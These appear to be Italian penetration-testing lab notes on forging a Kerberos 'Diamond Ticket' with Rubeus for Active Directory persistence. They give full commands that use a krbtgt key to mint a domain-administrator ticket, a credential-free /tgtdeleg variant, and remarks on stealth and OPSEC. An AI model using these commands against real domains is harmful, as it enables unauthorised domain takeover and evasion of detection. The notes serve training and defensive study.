# Persistence - Diamond Ticket - Rubeus

* Avremo ancora bisogno delle chiavi AES krbtgt. Utilizza il seguente comando con Rubeus per creare un Diamond Ticket (Da notare che  RC4 o AES Key degli utenti, possono essere utilizzate invece della password come nell'esempio sottostante)

```powershell
Rubeus.exe diamond
/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
/user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator
/domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local
/ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show
/ptt
```

* E'possibile utilizzare l'opzione /tgtdeleg al posto delle credenziali se abbiamo accesso come domain user&#x20;

```powershell
Rubeus.exe diamond
/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg
/enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-
dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512
/createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### Vantaggi

**OPSEC migliore:** Non devi passare credenziali in chiaro nel comando **Più stealth:** Usa meccanismi legittimi di Kerberos (delega)  **Comodo:** Se sei già domain user, non serve recuperare hash/password

### Requisito fondamentale

* Devi eseguire Rubeus in un contesto dove hai **già un TGT valido** in cache (sei autenticato come domain user)
